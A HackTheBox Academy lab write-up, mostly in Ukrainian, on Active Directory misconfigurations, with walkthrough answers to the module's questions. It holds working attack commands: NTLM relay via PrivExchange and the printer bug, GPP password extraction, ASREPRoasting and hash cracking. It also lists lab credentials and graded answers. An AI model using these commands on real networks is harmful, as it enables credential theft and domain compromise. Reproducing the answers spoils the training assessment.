# Miscellaneous Misconfigurations

## ℹ️ Informations

- **Website:** HackTheBox
- **Module:** Active Directory Enumeration & Attacks
- **Link:** https://academy.hackthebox.com/app/module/143/section/1276

---

## Теорія

Існує безліч інших атак та цікавих неправильних конфігурацій, які можна зустріти під час пентесту. Глибоке розуміння AD допомагає знайти проблеми, які інші можуть пропустити.

### Scenario Setup
У цьому розділі ми переміщуємось між Windows (MS01) та Linux (ATTACK01) хостами:
- RDP: `10.129.26.43` (ACADEMY-EA-MS01) | `htb-student` / `Academy_student_AD!`
- SSH (з MS01): `172.16.5.225` | `htb-student` / `HTB_@cademy_stdnt!`

### Exchange Related Group Membership
Exchange Windows Permissions не є захищеною групою, але члени можуть записувати DACL до доменного об'єкту → DCSynс привілеї.  
Organization Management (фактично "Domain Admins Exchange") має повний контроль над Microsoft Exchange Security Groups.

```powershell
# Перевірка членів групи Exchange Windows Permissions
Get-DomainGroupMember -Identity "Exchange Windows Permissions" | Select-Object MemberName
PrivExchange
Атака PrivExchange використовує функцію PushSubscription Exchange API для примусового надсилання NTLM аутентифікації до атакуючого хоста, після чого виконується NTLM relay → DCSync.

bash
# Запуск ntlmrelayx для пересилання до DC
ntlmrelayx.py -t ldap://10.129.26.x --escalate-user wley
python privexchange.py -ah 10.10.14.x -u wley -p 'transporter@4' -d inlanefreight.local 10.129.26.x
Printer Bug (MS-RPRN)
Функція SpoolService дозволяє примусити хост аутентифікуватися до будь-якого хоста через MS-RPRN протокол.

powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
bash
# Примусова аутентифікація DC до нашого хоста
python printerbug.py inlanefreight.local/wley:'transporter@4'@10.129.26.x 10.10.14.x
MS14-068
Уразливість у Windows Kerberos, яка дозволяла звичайним користувачам підробляти Kerberos PAC — фактично ставати Domain Admin.

LDAP Credential Sniffing
Зловмисники можуть перехоплювати cleartext LDAP bind credentials якщо програми використовують LDAP без шифрування.

adidnsdump — DNS Enumeration
Всі DNS записи домену зберігаються в AD; autentificated користувачі можуть читати їх через LDAP.

bash
adidnsdump -u inlanefreight\\forend ldap://10.129.26.x
adidnsdump -u inlanefreight\\forend ldap://10.129.26.x -r  # resolve unknown records
cat records.csv | grep -v "False" | grep -v "Type"
Passwords in Description Field
Адміни іноді залишають паролі у полі Description облікового запису.

powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

# samaccountname  description
# ldap.agent      *** DO NOT CHANGE *** 3/12/2012: Sunsh1ne4All!
PASSWD_NOTREQD Field
Якщо для облікового запису встановлено прапор PASSWD_NOTREQD у userAccountControl, пароль може бути відсутній або коротший за поточну політику.

powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

# samaccountname    useraccountcontrol
# guest             ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
# mlowe             PASSWD_NOTREQD, NORMAL_ACCOUNT
# ehamilton         PASSWD_NOTREQD, NORMAL_ACCOUNT
# nagiosagent       PASSWD_NOTREQD, NORMAL_ACCOUNT
# ygroce            PASSWD_NOTREQD, NORMAL_ACCOUNT
Credentials in SMB Shares and SYSVOL Scripts
powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
# sPwd = "!qazXSW@"
Group Policy Preferences (GPP) Passwords
GPP зберігає паролі у зашифрованому вигляді (AES-256) у файлах XML на SYSVOL, але Microsoft опублікував приватний ключ → легко розшифровується.

bash
# CrackMapExec — автоматично знаходить GPP паролі
crackmapexec smb 10.129.26.x -u forend -p Klmcargo2 -M gpp_password
crackmapexec smb 10.129.26.x -u forend -p Klmcargo2 -M gpp_autologin
ASREPRoasting
Якщо для облікового запису вимкнена Kerberos pre-authentication (DONT_REQ_PREAUTH), атакуючий може запросити AS-REP від KDC від імені цього користувача без пароля, після чого крекнути хеш офлайн.

powershell
# Знайти уразливих користувачів
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,userprincipalname,useraccountcontrol | fl

# samaccountname        : mmorgan
# samaccountname        : ygroce
powershell
# Rubeus — отримати AS-REP хеш
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
bash
# GetNPUsers.py — з Linux
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 10.129.26.x -no-pass -usersfile valid_users.txt

# $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:...hash...
bash
# Hashcat — крекнути хеш
hashcat -m 18200 ygroce_hash.txt /usr/share/wordlists/rockyou.txt
GPO Abuse
SharpGPOAbuse та PowerView можна використати для модифікації GPO якщо є відповідні права.

bash
# Перевірка прав на GPO
Get-DomainGPO | Get-ObjectAcl | where {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty"}
❓ Question 1
Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".

📋 Walkthrough
Підключення до MS01 (Windows):

bash
xfreerdp /v:10.129.26.43 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution
Завантажити PowerView та знайти користувачів з PASSWD_NOTREQD:

powershell
PS C:\htb> cd C:\Tools
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname    useraccountcontrol
--------------    ------------------
guest             ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe             PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton         PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
nagiosagent       PASSWD_NOTREQD, NORMAL_ACCOUNT
ygroce            PASSWD_NOTREQD, NORMAL_ACCOUNT
З виводу видно користувача ygroce — єдиний що починається на літеру "y".

✅ Answer: ygroce
❓ Question 2
Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.

📋 Walkthrough
Крок 1 — Знайти користувача з вимкненою pre-authentication:

powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname        : mmorgan
userprincipalname     : mmorgan@inlanefreight.local
useraccountcontrol    : NORMAL_ACCOUNT, DONT_REQ_PREAUTH

samaccountname        : ygroce
userprincipalname     : ygroce@inlanefreight.local
useraccountcontrol    : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_REQ_PREAUTH
Модуль використовував mmorgan як приклад, але для нашого завдання уразливий користувач — ygroce.

Крок 2 — ASREPRoast з Rubeus:

powershell
PS C:\Tools> .\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : ygroce
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Generating EncryptedTimestamp AS-REQ for 'ygroce@INLANEFREIGHT.LOCAL'...
[+] Successfully received AS-REP!
[*] base64(ticket.kirbi):

$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:0ec65f...5f9a7a
Збереження хешу у файл:

powershell
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat | Out-File -FilePath C:\Tools\ygroce.txt
Крок 3 — Крекнути хеш за допомогою Hashcat з Linux:

bash
# Скопіювати файл з хешем на ATTACK01 або запустити Hashcat локально
hashcat -m 18200 ygroce.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:...:[CRACKED]

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP

Candidates.#1....: Pass@word

ygroce:Pass@word
Альтернативно — з Linux через GetNPUsers.py:

bash
# SSH до ATTACK01
ssh htb-student@10.129.26.44  # пароль: HTB_@cademy_stdnt!

# ASREPRoast через GetNPUsers.py
GetNPUsers.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -request -outputfile asrep_hashes.txt

# Крекнути
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# Result: Pass@word
✅ Answer: Pass@word
